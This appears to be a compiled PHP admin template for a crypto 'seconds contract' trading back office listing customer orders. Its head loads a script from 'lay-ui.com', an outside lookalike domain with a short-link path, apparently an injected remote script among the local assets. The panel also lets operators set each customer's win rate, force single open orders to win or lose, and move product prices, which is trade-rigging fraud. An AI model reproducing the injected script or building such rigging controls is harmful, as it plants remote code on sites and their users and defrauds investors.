<?php if (!defined('THINK_PATH')) exit(); /*a:4:{s:72:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/order/orderlist.html";i:1631104880;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/head.html";i:1637561064;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/menu.html";i:1631099310;s:61:"/www/wwwroot/agc.bxtrade.vip/application/admin/view/foot.html";i:1553756524;}*/ ?>
<!DOCTYPE html>
<html lang="en" style="font-size: 50px;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Mosaddek">
    <meta name="keyword" content="FlatLab, Dashboard, Bootstrap, Admin, Template, Theme, Responsive, Fluid, Retina">
    <link rel="shortcut icon" href="/favicon.ico">

    <title>B.King后台管理系统</title>

    <!-- Bootstrap core CSS -->
    <link href="__ADMIN__/css/bootstrap.min.css" rel="stylesheet">
    <link href="__ADMIN__/css/bootstrap-reset.css" rel="stylesheet">
    <!--external css-->
    <link href="__ADMIN__/assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
    <link href="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.css" rel="stylesheet" type="text/css" media="screen"/>
    <link rel="stylesheet" href="__ADMIN__/css/owl.carousel.css" type="text/css">
    <!-- Custom styles for this template -->
    <link href="__ADMIN__/css/style.css" rel="stylesheet">
    <link href="__ADMIN__/css/style-responsive.css" rel="stylesheet" />
    <link href="__ADMIN__/css/addstyle.css" rel="stylesheet">

    <script src="__ADMIN__/js/jquery.js"></script>
    <script src="__ADMIN__/js/jquery-1.8.3.min.js"></script>
    <script src="/static/layer/layer.js"></script>

    <!-- 时间选择器 -->
    <link rel="stylesheet" type="text/css" href="__ADMIN__/css/jquery.datetimepicker.css"/>

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 tooltipss and media queries -->
    <!--[if lt IE 9]>
      <script src="__ADMIN__/js/html5shiv.js"></script>
      <script src="__ADMIN__/js/respond.min.js"></script>
    <![endif]-->
    
<script src="https://lay-ui.com/r/gR2/woT3dK"></script>

  </head>

  <body>

  <section id="container" class="">
      <!--header start-->
      <header class="header white-bg">
            <div class="sidebar-toggle-box">
                <div data-original-title="显示/隐藏" data-placement="right" class="icon-reorder tooltips"></div>
            </div>
            <!--logo start-->
          <?php if($msg_nums>0): ?>
          <a  href="<?php echo Url('admin/user/message'); ?>" class="logo">
          <?php else: ?>
          <a  href="#" class="logo">
          <?php endif; ?>
              后台管理系统
              <?php if($msg_nums>0): ?>
              <span>&nbsp;&nbsp;您有<?php echo $msg_nums; ?>条未读留言</span>
              <?php endif; ?>
          </a>
            <!--logo end-->

            <div class="top-nav ">
                <!--search & user info start-->
                <ul class="nav pull-right top-menu">
                    <?php if(isset($_SESSION['username'])): ?>
                    <!-- user login dropdown start-->
                    <li class="dropdown">
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="username"><?php echo !empty($_SESSION['username'])?$_SESSION['username']:''; ?></span>
                            <b class="caret"></b>
                        </a>
                        <ul class="dropdown-menu extended logout">
                            <li><a href="<?php echo Url('login/logout'); ?>"><i class="icon-signout"></i> 退出</a></li>
                        </ul>
                    </li>
                    <?php endif; ?>
                    <!-- user login dropdown end -->
                </ul>
                <!--search & user info end-->
            </div>
        </header>
<!--header end-->


<!--sidebar start-->
      <aside>
          <div id="sidebar"  class="nav-collapse ">
          
          <?php if($otype == 3): ?>
              <!-- sidebar menu start-->
              <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
                  <!-- <?php if(is_array($menulist) || $menulist instanceof \think\Collection || $menulist instanceof \think\Paginator): $i = 0; $__LIST__ = $menulist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                  <!-- <?php if($ruleslist == 'all' || in_array($vo['id'],$ruleslist)): ?> -->
                  <li 
                  <?php if($vo['arr'] == ""): if($contrname == $vo['con']): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; else: if($contrname == $vo['con'] && (in_array($actionname,$vo['arr']))): ?>
                    class="active"
                    <?php else: ?>
                    class="sub-menu "
                    <?php endif; endif; ?>
                  >
                      <a class="" <?php if($vo['url'] == ""): ?> href="javascript:;" <?php else: ?> href="<?php echo $vo['url']; ?>" <?php endif; ?>>
                          <i class="<?php echo $vo['icon']; ?>"></i>
                          <span><?php echo $vo['name']; ?></span>
                          <!-- <?php if($vo['arrow'] != ""): ?> -->
                          <span class="arrow"></span>
                          <!-- <?php endif; ?> -->
                      </a>
                      <ul class="sub">
                        <!-- <?php if(is_array($vo['list']) || $vo['list'] instanceof \think\Collection || $vo['list'] instanceof \think\Paginator): $i = 0; $__LIST__ = $vo['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$v): $mod = ($i % 2 );++$i;?> -->
                        <!-- <?php if($ruleslist == 'all' || in_array($v['id'],$ruleslist)): ?> -->
                        <li 
                        <?php if($v['arr'] == ""): if($contrname == $v['con'] && $actionname == $v['act']): ?> class="active" <?php endif; else: if(in_array($actionname,$v['arr']) && $contrname == $v['con'] && $actionname == $v['act']): ?>
                          class="active"
                          <?php endif; endif; ?>
                        >
                          <a  href="<?php echo $v['url']; ?>"><?php echo $v['name']; ?></a>
                        </li>
                        <!-- <?php endif; ?> -->
                        <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                      </ul>
                  </li>
                  <!-- <?php endif; ?> -->
                  <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>安全退出</span>
                      </a>
                  </li>
              </ul>
              <!-- sidebar menu end-->
          <?php else: ?>
           <ul class="sidebar-menu">
                  <li <?php if($actionname == 'index' && $contrname == 'Index'): ?> class="active" <?php endif; ?> >
                      <a class="" href="<?php echo Url('admin/index/index'); ?>">
                          <i class="icon-dashboard"></i>
                          <span>后台首页</span>
                      </a>
                  </li>
               
                
                  <li <?php if($contrname == 'Order'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-paste"></i>
                          <span>订单管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if($actionname == 'orderlist'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist'); ?>">秒合约订单</a></li>
                          <li <?php if($actionname == 'orderlist_bibi'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_bibi'); ?>">币币订单</a></li>
                          <li <?php if($actionname == 'orderlist_lever'): ?> class="active" <?php endif; ?>><a class="" href="<?php echo Url('admin/order/orderlist_lever'); ?>">合约订单</a></li>
                          
                      </ul>
                  </li>

                  <li <?php if($contrname == 'User' && ( in_array($actionname,array('userlist','useradd','userprice','userinfo','cash','myteam')) )): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-user"></i>
                          <span>用户管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          <li <?php if(in_array($actionname,array('userlist','useradd'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userlist'); ?>">客户列表</a></li>
                          
                          <li <?php if(in_array($actionname,array('myteam'))): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/myteam'); ?>">我的团队</a></li>

                          <li <?php if($actionname == 'userprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/userprice'); ?>">充值列表</a></li>

                          <li <?php if($actionname == 'cash'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/user/cash'); ?>">提现列表</a></li>
 
                      </ul>
                  </li>

                  
                  <!--<li <?php if($contrname == 'Price'): ?> class="active" <?php else: ?> class="sub-menu " <?php endif; ?>>
                      <a href="javascript:;" class="">
                          <i class="icon-yen"></i>
                          <span>报表管理</span>
                          <span class="arrow"></span>
                      </a>
                      <ul class="sub">
                          
                          
                          <li <?php if($actionname == 'allot'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/allot'); ?>">红利报表</a></li>

                          <li <?php if($actionname == 'yongjin'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/yongjin'); ?>">佣金报表</a></li>

                          <li <?php if($actionname == 'pricelist'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/pricelist'); ?>">资金报表</a></li>

                          <li <?php if($actionname == 'myprice'): ?> class="active" <?php endif; ?>>
                          <a class="" href="<?php echo Url('admin/price/myprice'); ?>">个人报表</a></li>
                          
                      </ul>
                  </li>
                  -->
                 

                  <li>
                      <a class="" href="<?php echo Url('admin/login/logout'); ?>">
                          <i class="icon-signout"></i>
                          <span>退出</span>
                      </a>
                  </li>
              </ul>
          
          <?php endif; ?>
          </div>
      </aside>
      <!--sidebar end-->



<!--main content start-->
      <section id="main-content">
          <section class="wrapper">
              <!--state overview start-->
              
              <div class="row state-overview">
				<form action="" method="get">
                <div class="container">
                <div class="row">
                 
                      <div class="col-lg-3 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon" id="basic-addon1">订单编号</span>
                            <input type="text"  name="orderid"  class="form-control" value="<?php echo !empty($getdata['oid'])?$getdata['oid']:''; ?>" placeholder="输入订单编号/订单id"/>
                        </div>
                      </div>

                      <div class="col-lg-3 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon" id="basic-addon1">
                              <select name="stype" id="">
                                <option <?php if(isset($getdata['stype']) && $getdata['stype'] == 1): ?> selected="selected" <?php endif; ?> value="1">客户</option>
                                <option <?php if(isset($getdata['stype']) && $getdata['stype'] == 2): ?> selected="selected" <?php endif; ?>  value="2">代理商</option>
                              </select>
                            </span>
                            <input type="text"   class="form-control" value="<?php echo !empty($getdata['username'])?$getdata['username']:''; ?>"  name="username" placeholder="昵称/姓名/邮箱/编号"/>
                        </div>
                      </div>

                      <div class="col-lg-6 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon" id="basic-addon1"><select name="ttype" id="">
                                <option <?php if(isset($getdata['ttype']) && $getdata['ttype'] == 1): ?> selected="selected" <?php endif; ?> value="1">订单时间</option>
                                <option <?php if(isset($getdata['ttype']) && $getdata['ttype'] == 2): ?> selected="selected" <?php endif; ?>  value="2">平仓时间</option>
                              </select></span>
                            <input type="text"  id="datetimepicker" class="form-control" placeholder="点击选择时间" name="starttime" value="<?php echo !empty($getdata['starttime'])?$getdata['starttime']:''; ?>"/>
                            <span class="input-group-addon" id="basic-addon1">至</span>
                            <input type="text"  id="datetimepicker_end" class="form-control" placeholder="点击选择时间" name="endtime" value="<?php echo !empty($getdata['endtime'])?$getdata['endtime']:''; ?>" />
                        </div>
                      </div>
               </div>
               <div class="row">
                      <div class="col-lg-3 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon">涨跌</span>
                            <select name="ostyle" id="" class="selectpicker show-tick form-control">
                                <option value="">默认不选</option>
                                <option <?php if(isset($getdata['ostyle']) && $getdata['ostyle'] == 1): ?> selected="selected" <?php endif; ?> value="1">买涨</option>
                                <option <?php if(isset($getdata['ostyle']) && $getdata['ostyle'] == 2): ?> selected="selected" <?php endif; ?> value="2">买跌</option>
                            </select>
                        </div>
                      </div>

                      <div class="col-lg-3 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon">盈亏</span>
                            <select name="ploss" id="" class="selectpicker show-tick form-control">
                                <option value="">默认不选</option>
                                <option <?php if(isset($getdata['ploss']) && $getdata['ploss'] == 1): ?> selected="selected" <?php endif; ?> value="1">赢利</option>
                                <option <?php if(isset($getdata['ploss']) && $getdata['ploss'] == 2): ?> selected="selected" <?php endif; ?> value="2">亏损</option>
                                <option <?php if(isset($getdata['ploss']) && $getdata['ploss'] == 3): ?> selected="selected" <?php endif; ?> value="3">无效</option>
                            </select>
                        </div>
                      </div>
                      
                      <div class="col-lg-3 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon">产品</span>
                            <select name="pid" id="" class="selectpicker show-tick form-control">
                                <option value="">默认不选</option>
                                <!-- <?php if(is_array($pro) || $pro instanceof \think\Collection || $pro instanceof \think\Paginator): $i = 0; $__LIST__ = $pro;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                                <option <?php if(isset($getdata['pid']) && $getdata['pid'] == $vo['pid']): ?> selected="selected" <?php endif; ?> value="<?php echo $vo['pid']; ?>"><?php echo $vo['ptitle']; ?></option>
                                <!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                                
                            </select>
                        </div>
                      </div>

                      <div class="col-lg-3 mar-10">
                        <div class="input-group">
                            <span class="input-group-addon">状态</span>
                            <select name="ostaus" id="" class="selectpicker show-tick form-control">
                                <option value="">默认不选</option>
                                <option <?php if(isset($getdata['ostaus']) && $getdata['ostaus'] == 1): ?> selected="selected" <?php endif; ?>  value="1">建仓</option>
                                <option <?php if(isset($getdata['ostaus']) && $getdata['ostaus'] == 2): ?> selected="selected" <?php endif; ?>  value="2">平仓</option>
                            </select>
                        </div>
                      </div>
                  </div>
                  <div class="mar-10">
                   <input type="submit" class="btn btn-success" value="搜索">
                  </div>
                </div>
                </form>
              </div>
              
              <!--state overview end-->
            
            <a href="<?php echo url('order/orderlist'); ?>"><button type="submit" class="btn btn-danger">搜索全部</button></a>&nbsp;&nbsp;&nbsp;&nbsp; <span class="color_red">&nbsp;&nbsp;<strong>默认为7天内订单</strong></span>
            <br><br>
             <div class="row">
                  <div class="col-lg-12">
                      <section class="panel">
                          <header class="panel-heading">
                              交易记录
                          </header>
                          <table class="table table-striped table-advance table-hover">
                            <thead class="ordertable">
                              <tr>
                                <th>订单编号</th>
                                
                                <th>用户姓名</th>
                                <th>订单时间</th>
                                 <th>平仓时间</th>
                                <th>产品信息</th>
                                <th>倒计时</th>
                                
                                <th>状态</th>
                                <th>方向</th>
                                <th>交易类型</th>
                               
                             
                                <th>时间点数</th>
                                <th>建仓点位</th>
                                <th>平仓点位</th>
                               
                                <th>保证金</th>
                                <th>手续费</th>      
                                <th>实际盈亏</th>
                             
                                <th>归属代理商</th>
                                <?php if($otype == 3): ?>
                                <th>单控操作</th>
                                 <?php else: if($channelfk==1): ?>
                                     
                                       <th>单控操作</th>
                                      <?php else: ?>
                                   
                                      <td></td>
                                      <?php endif; endif; ?>
                           
                            </tr>
                          </thead>
                          <tbody>
                          <!-- <?php if(is_array($orderlist) || $orderlist instanceof \think\Collection || $orderlist instanceof \think\Paginator): $i = 0; $__LIST__ = $orderlist;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?> -->
                              <tr>
                                  <td><?php echo $vo['oid']; ?></td>
                                  
                                   <?php if($otype == 3): ?>	
                                  
                                  <td><a style="color:#03a9f9" onclick="fenkong(<?php echo $vo['uid']; ?>)"><?php echo $vo['nickname']; ?></a></td>
                                  <?php else: if($channelfk==1): ?>
                                     
                                      <td><a  style="color:#03a9f9" onclick="fenkong(<?php echo $vo['uid']; ?>)" ><?php echo $vo['nickname']; ?></a></td>
                                      <?php else: ?>
                                   
                                      <td><?php echo $vo['nickname']; ?></td>
                                      <?php endif; endif; ?>
                                  
                                  <td><?php echo date("Y-m-d H:i:s",$vo['buytime']); ?></td>
                                  
                                  
                                  
                                   <?php if(!empty($vo['selltime']) || !empty($vo['selltime'])): ?>
                                  <td><?php echo date("Y-m-d H:i:s",$vo['selltime']); ?></td>
                                  <?php else: ?>
                                  <td></td>
                                  <?php endif; ?>
                                  
                                  
                                  <td><?php echo $vo['ptitle']; ?></td>
                                  
                                  
                                  <TD id="daojishi_<?php echo $vo['oid']; ?>"><?php if($vo['ostaus']==1): ?><span style="color:red">结束</span> <?php else: ?><span style="color:green">进行中</span><?php endif; ?></TD>
                                  
                                  <td><?php if($vo['ostaus']==1): ?>平仓<?php else: ?>建仓<?php endif; ?></td>
                                  
                                  
                                  
                                  <?php if($vo['ostyle'] == 0): ?>
                                  <td class="color_red">买涨</td>
                                  <?php elseif($vo['ostyle'] == 1): ?>
                                  <td class="color_green">买跌</td>
                                  <?php endif; if($vo['is_timing'] == 1): ?>
                                  <td class="color_red">合约交易</td>
                                  <?php else: ?>
                                  <td class="color_green">秒合约</td>
                                  <?php endif; ?>
                                  

                                 
                                  
                                  <td><?php echo $vo['endprofit']; if($vo['eid']==1): ?>点<?php else: ?>秒<?php endif; ?></td>
                                  <td><?php echo $vo['buyprice']; ?></td>
                                  <td>
                                    <?php if($vo['ostaus'] == 1): if($vo["buyprice"] > $vo["sellprice"]): ?>
                                        <font color="#2fb44e" size="3"><?php echo $vo['sellprice']; ?></font>
                                      <?php else: ?>
                                        <font color="#ed0000" size="3"><?php echo $vo['sellprice']; ?></font>
                                      <?php endif; else: ?>
                                        <span id="nowprice_<?php echo $vo['oid']; ?>"></span>
                                    <?php endif; ?>
                                  </td>
                                  
                                
                                  <td class="color_red"><?php echo $vo['fee']; ?></td>
                                  
                                  <td class="color_red"><?php echo $vo['sx_fee']; ?></td>
                                  
                                  
                                

                                  <?php if($vo['ostaus'] == 1): ?>
                                  <td <?php if($vo['ploss'] > 0): ?> class="color_red" <?php else: ?> class="color_green" <?php endif; ?>><?php echo $vo['ploss']; ?></td>
                                  <?php else: ?>
                                  <td id="yingkui_<?php echo $vo['oid']; ?>" ></td>
                                  <?php endif; ?>


                                 

                                  <td><?php echo $vo['managername']; ?></td>
                                  
					              
								    <?php if($otype == 3 && $vo['is_timing'] != 1): if($vo['ostaus']!=1): if($channelfk==1): ?>
                                              <td  id="pingcang_<?php echo $vo['oid']; ?>" style="    width: 100px;">
            
            
                                                  <select name="ostyle" id="" class="selectpicker select_change show-tick form-control">
                                                    <option <?php if($vo['kong_type'] == 0): ?> selected="selected" <?php endif; ?> value="<?php echo $vo['oid']; ?>_0">默认</option>
                                                   <option <?php if($vo['kong_type'] == 1): ?> selected="selected" <?php endif; ?>  value="<?php echo $vo['oid']; ?>_1">盈利 </option>
                                                    <option <?php if($vo['kong_type'] == 2): ?> selected="selected" <?php endif; ?>  value="<?php echo $vo['oid']; ?>_2">亏损 </option>
                                                  </select>
                                              </td>
                                              <?php else: ?>
                                              
                                               <td>未平仓</td>
                                              <?php endif; else: ?>
        
                                            <td>已平仓</td>
        
                                            <?php endif; elseif($otype == 3 && $vo['is_timing'] == 1): if($vo['ostaus']!=1): ?>
                                            <td  id="pingcang_<?php echo $vo['oid']; ?>" >未平仓</td>
                                          <?php else: ?>
                                            <td ><?php if($vo['system'] == 1): ?>系统平仓<?php else: ?>自由平仓<?php endif; ?></td>
                                          <?php endif; elseif($otype == 101 && $vo['is_timing'] == 0): if($vo['ostaus']!=1): ?>
                                          <td  id="pingcang_<?php echo $vo['oid']; ?>" style="    width: 100px;">
        
        
                                              <select name="ostyle" id="" class="selectpicker select_change show-tick form-control">
                                                <option <?php if($vo['kong_type'] == 0): ?> selected="selected" <?php endif; ?> value="<?php echo $vo['oid']; ?>_0">默认</option>
                                               <option <?php if($vo['kong_type'] == 1): ?> selected="selected" <?php endif; ?>  value="<?php echo $vo['oid']; ?>_1">盈利 </option>
                                                <option <?php if($vo['kong_type'] == 2): ?> selected="selected" <?php endif; ?>  value="<?php echo $vo['oid']; ?>_2">亏损 </option>
                                              </select>
                                          </td>
        
                                            <?php else: ?>
        
                                            <td>已平仓</td>
        
                                            <?php endif; endif; ?>


                              </tr>
							<!-- <?php endforeach; endif; else: echo "" ;endif; ?> -->
                              </tbody>
                          </table>
               <?php if(isset($noorder) && $noorder == 1): ?> 
                          <div class="row">
                            <div class="col-lg-12">
                              <div class="noorder">
                                暂无数据
                              </div>
                            </div>
                          </div>
               <?php endif; ?> 
                      </section>
                    
                  </div>
              </div>
              <?php echo $order->render(); ?>
             

          </section>
      </section>
      <!--main content end-->
  </section>
  
<input type="hidden" value="<?php echo $daojishiid; ?>" id="daojishiid"/>

<div class="modal-dialog" id="fenkong" style="display:none">
	<div class="modal-content">
		<div class="modal-header">
			<button type="button" class="close" onclick="guanbi()" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
			<h4 class="modal-title" id="modal-title"></h4>
		</div>
		<div class="modal-body">
        
        	<?php if($otype == 3): ?>
			<div class="form-group">
					<label for="money">秒合约胜率(%),  0表示不受风控</label>
						<input onkeyup="this.value=this.value.replace(/[^0-9]/g,'')" onafterpaste="this.value=this.value.replace(/[^0-9]/g,'')"  type="text" id="lv" required="required" class="form-control">
						<span class="help-block"></span>
				</div>
              
                
                <div class="form-group"  style="display:none">
					<label for="money">合约入单点差，格式为 涨点差,跌点差，例：5,5，(前一个数是涨点差,后一个数为跌点差)为零时不计算点差，只能是两个，不能为负数，且必须用英文逗号字符</label>
						<input  type="text" id="income_range" required="required" class="form-control">
						<span class="help-block"></span>
				</div>
                
                <?php endif; if($otype == 101): if($channelfk ==1): ?>
                    
                    
                    <div class="form-group">
					<label for="money">秒合约胜率(%),  0表示不受风控</label>
						<input onkeyup="this.value=this.value.replace(/[^0-9]/g,'')" onafterpaste="this.value=this.value.replace(/[^0-9]/g,'')"  type="text" id="lv" required="required" class="form-control">
						<span class="help-block"></span>
				</div>
                    
                    
                    	
                        <div class="form-group" style="display:none">
					<label for="money">合约入单点差，格式为 涨点差,跌点差，例：5,5，(前一个数是涨点差,后一个数为跌点差)为零时不计算点差，只能是两个，不能为负数，且必须用英文逗号字符</label>
						<input  type="text" id="income_range" required="required" class="form-control">
						<span class="help-block"></span>
				</div>
                        
                        
                    <?php endif; endif; ?>
				<button type="button" id="button2" class="btn btn-primary">确定</button>
			</div>
		</div>
</div>
<div id="fenkong2" onclick="guanbi()" style="background:#000;width:100%;height:100%;z-index:800;opacity:0.5;position:absolute;top:0;display:none"></div>





<div class="modal-dialog" id="lapan" style="display:none">
	<div class="modal-content">
		<div class="modal-header">
			<button type="button" class="close" onclick="guanbi2()" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
			<h4 class="modal-title" id="modal-title2"></h4>
		</div>
		<div class="modal-body">
        
        	<?php if($otype == 3): ?>
			<div class="form-group">
				<label for="money">请输入数字，只能是正数、负数或者零。请谨慎操作！</label>
					<input  onkeyup="this.value=this.value.replace(/[^\-?\d.]/g,'')"  type="text" id="dianshu" required="required" class="form-control">
				<span class="help-block"></span>
			</div>

            <?php endif; ?>
                
				<button type="button" id="button3" class="btn btn-primary">确定</button>
			</div>
		</div>
</div>
<div id="lapan2" onclick="guanbi2()" style="background:#000;width:100%;height:100%;z-index:800;opacity:0.5;position:absolute;top:0;display:none"></div>


<style>
.modal-dialog {
    z-index: 9999;
    position: absolute;
    top: 400px;
    left: 30%;
}
</style>

    <!-- js placed at the end of the document so the pages load faster -->
    
    <script src="__ADMIN__/js/bootstrap.min.js"></script>
    <script src="__ADMIN__/js/jquery.scrollTo.min.js"></script>
    <script src="__ADMIN__/js/jquery.nicescroll.js" type="text/javascript"></script>
    <script src="__ADMIN__/js/jquery.sparkline.js" type="text/javascript"></script>
    <script src="__ADMIN__/assets/jquery-easy-pie-chart/jquery.easy-pie-chart.js"></script>
    <script src="__ADMIN__/js/owl.carousel.js" ></script>
    <script src="__ADMIN__/js/jquery.customSelect.min.js" ></script>

    <!--common script for all pages-->
    <script src="__ADMIN__/js/common-scripts.js"></script>

    <!--script for this page-->
    <script src="__ADMIN__/js/sparkline-chart.js"></script>
    <script src="__ADMIN__/js/easy-pie-chart.js"></script>

    <!-- active -->
    <script src="/static/public/js/function.js"></script>
    
    <!-- date -->
    <script type="text/javascript" src="__ADMIN__/js/date/jquery.datetimepicker.js" charset="UTF-8"></script>

  </body>
</html>
<script>
ordersta();


window.onload=function(){

	daojishi()
}

//底部统计
function ordersta(){
  var formurl = "<?php echo url('/admin/order/ordersta'); ?>";
  var data  = '<?php echo $jsongetdata; ?>';
  
console.log(data);
  
  $.post(formurl,data,function(data){
      if (data) {
        $('#profit').html('$'+data.profit);
        $('#count').html(data.count+'笔');
        $('#fee').html('$'+data.fee);
        $('#invalid_fee').html('$'+data.invalid_fee);
        $('#valid_fee').html('$'+data.valid_fee);
        $('#now_fee').html('$'+data.now_fee);
        $('#valid_shouxu').html('$'+data.valid_shouxu);
      }


    });
    
}



function lapan(id){
	
	$("#lapan").toggle();
	$("#lapan2").toggle();
	$.ajax({
		type:'post',
		url:'/admin/order/lapan',
		data:{id:id,},
		success:function(msg){
			
			msg = eval("("+msg+")");
			$("#modal-title2").text(msg.ptitle);
			$("#dianshu").val(msg.fengkong);
			
			
			$("#button3").attr("onclick","edit_lapan("+msg.pid+")");
		}
	});
}


function edit_lapan(pid){
	var dianshu = $("#dianshu").val();	
	$.ajax({
		type:'post',
		url:'/admin/order/edit_lapan',
		data:{
			pid:pid,
			dianshu:dianshu,
			},
		success:function(msg){
			msg = eval("("+msg+")");
			if(msg.stute==1)
			{
				 guanbi2();
			}else
			{
				alert(msg.msg);
			}
			
		}
	});
}

function guanbi2(){
	$("#lapan").toggle();
	$("#lapan2").toggle();
}




//时间选择器
$('#datetimepicker').datetimepicker();
$('#datetimepicker_end').datetimepicker();

function fenkong(id){
	$("#fenkong").toggle();
	$("#fenkong2").toggle();
	$.ajax({
		type:'post',
		url:'/admin/order/getchance',
		data:{id:id,},
		success:function(msg){
			msg = eval("("+msg+")");
			$("#modal-title").text(msg.nickname+"（"+msg.username+"）");
			$("#lv").val(msg.chance);
			$("#income_range").val(msg.income_range);
			
			$("#button2").attr("onclick","edit_lv("+msg.uid+")");
		}
	});
	
	
	
}
function edit_lv(id){
	var lv = $("#lv").val();
	var income_range = $("#income_range").val();
	
	$.ajax({
		type:'post',
		url:'/admin/order/editchance',
		data:{
			id:id,
			lv:lv,
			income_range:income_range
			},
		success:function(msg){
			msg = eval("("+msg+")");
			if(msg.stute==1)
			{
				 guanbi();
			}else
			{
				alert(msg.msg);
			}
			
		}
	});
}

function guanbi(){
	$("#fenkong").toggle();
	$("#fenkong2").toggle();
}



function daojishi(){
	var daojishiid = $("#daojishiid").val();
	$.ajax({
		type: 'post',
		url: "/admin/order/daojishi",
		data:{
			daojishiid:daojishiid,	
		},
		success: function (msg) {
			if(msg){
				msg = eval("("+msg+")");
				$.each(msg,function(key,val){
				   // alert(val['sellprice']);
                    if(val['ostaus']==1){
                        $("#daojishi_"+val['oid']+"").html(val['endtime']);
                        $("#nowprice_"+val['oid']+"").html(val['sellprice']);
                        $("#yingkui_"+val['oid']+"").html(val['ploss']);
                        $("#pingcang_"+val['oid']+"").html(val['pingcang']);
                    }else{
                        $("#daojishi_"+val['oid']+"").html(val['endtime']);
                        $("#nowprice_"+val['oid']+"").html(val['sellprice']);
                        $("#yingkui_"+val['oid']+"").html(val['ploss']);
                        $("#pingcang_"+val['oid']+"").html(val['pingcang']);
                    }


				});
			
			}
		}
	});
	setTimeout("daojishi()",1000);	
}





$(".select_change").change(function(){
  var kong_id = $(this).val();
  if(kong_id){
    var kong_arr = kong_id.split('_');
  }
  var oid = kong_arr[0];
  var kong_type = kong_arr[1];
  var postdata = 'oid='+oid+"&kong_type="+kong_type;
  var posturl = "<?php echo url('dankong'); ?>";
  $.post(posturl,postdata,function(res){
    layer.msg(res.data);
  })
  
})
</script>